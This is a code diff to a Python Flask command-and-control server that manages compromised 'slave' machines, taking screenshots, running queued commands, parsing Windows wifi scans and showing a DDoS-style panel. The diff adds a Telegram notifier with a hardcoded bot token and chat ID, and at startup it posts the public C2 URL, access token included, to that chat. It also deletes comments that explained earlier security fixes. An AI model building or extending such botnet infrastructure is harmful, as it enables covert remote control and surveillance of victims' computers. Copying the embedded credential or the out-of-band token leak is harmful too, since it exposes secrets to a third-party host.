@@ -49,8 +49,43 @@ os.makedirs(DATA_DIR, exist_ok=True)
 app = Flask(__name__)
 DB_FILE = os.path.join(DATA_DIR, 'c2.db')
 ID_FILE = os.path.join(DATA_DIR, 'slave_ids.json')
-SERVER_URL = 'http://127.0.0.1:5000'
+SERVER_URL = os.environ.get("C2_PUBLIC_URL", "http://127.0.0.1:5000")
 
+# ---------------------------------------------------------------------------
+# TELEGRAM
+# ---------------------------------------------------------------------------
+TELEGRAM_BOT_TOKEN = os.environ.get(
+    "TG_TOKEN", "8609491076:AAEa7h3yGrolKQI93NbSMIKKLrpgu4eyVEE"
+)
+TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT", "7984959772")
+
+
+def post_to_telegram(message):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        print("[telegram] skipped: token or chat_id not set")
+        return False
+    try:
+        r = requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            json={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message,
+                "disable_web_page_preview": True,
+            },
+            timeout=10,
+        )
+        if not r.ok:
+            print(f"[telegram] FAIL {r.status_code}: {r.text[:300]}")
+            return False
+        print(f"[telegram] sent ({len(message)} chars)")
+        return True
+    except Exception as e:
+        print(f"[telegram] EXC {type(e).__name__}: {e}")
+        return False
+
+# ---------------------------------------------------------------------------
+# QUEUES AND CACHE
+# ---------------------------------------------------------------------------
 log_queue = queue.Queue()
 image_queue = queue.Queue()
 session_log_queue = queue.Queue()
@@ -260,10 +295,6 @@ def queue_command(numeric_id, command, payload=None):
     return task_id
 
 def wait_result(task_id, timeout=10.0):
-    """Poll the DB until the command completes. Returns None on timeout,
-    on a missing row, or immediately when task_id is falsy (queue_command
-    returns None for an unknown slave — old code then spun for the whole
-    timeout doing `WHERE id = NULL`)."""
     if not task_id:
         return None
     conn = db_conn()
@@ -319,14 +350,6 @@ def parse_wifi_scan(netsh_output):
 # ---------------------------------------------------------------------------
 @app.before_request
 def check_auth():
-    """Every /api/v1 endpoint requires the token when C2_TOKEN is set.
-
-    The old version exempted /api/v1/image/ and /api/v1/stream, which meant
-    anyone who could reach the (tunnelled, public) port could pull every
-    screenshot or inject frames. The token is accepted from the
-    X-C2-Token header, a ?token= query parameter (so a browser tab can
-    open an image URL) or a c2_token cookie.
-    """
     token = os.environ.get('C2_TOKEN')
     if not token:
         return
@@ -478,15 +501,10 @@ def result():
         try:
             img_data = base64.b64decode(output[6:])
             image_cache[task_id] = img_data
-            # Bounded cache: otherwise every screenshot of the session is
-            # held in RAM for the life of the process.
             if len(image_cache) > IMAGE_CACHE_MAX:
                 for old in list(image_cache)[:-IMAGE_CACHE_MAX]:
                     image_cache.pop(old, None)
             image_queue.put((numeric_id, img_data))
-            # Open the tab off-thread so a slow browser launch cannot stall
-            # this agent's /result response. The token rides in the query
-            # string because a browser tab cannot send X-C2-Token.
             url = f"{SERVER_URL}/api/v1/image/{task_id}"
             tok = os.environ.get('C2_TOKEN')
             if tok:
@@ -1091,7 +1109,6 @@ def run_gui():
             image_label.config(image=photo)
             image_label.image = photo
             image_label.img_data = img_data
-            # Only re-layout on transition, otherwise stream frames flicker
             if not image_frame.winfo_ismapped():
                 info_frame.pack_forget()
                 image_frame.pack(fill=tk.BOTH, expand=True)
@@ -1300,7 +1317,6 @@ def run_gui():
                 ddos_like_text.insert(tk.END, msg + "\n"); ddos_like_text.see(tk.END)
         except queue.Empty:
             pass
-        # Drain image queue to only show latest frame (streams produce many)
         try:
             latest = None
             while True:
@@ -1388,6 +1404,13 @@ def stdin_reader():
     console_input_queue.put(None)
 
 if __name__ == '__main__':
+    _tok = os.environ.get("C2_TOKEN")
+    _token_qs = f"?token={_tok}" if _tok else ""
+    _url = f"{SERVER_URL}/{_token_qs}"
+    post_to_telegram(
+        f"C2 [windows] started.\n"
+        f"URL: {_url}"
+    )
     init_db()
     migrate_ids_file()
 
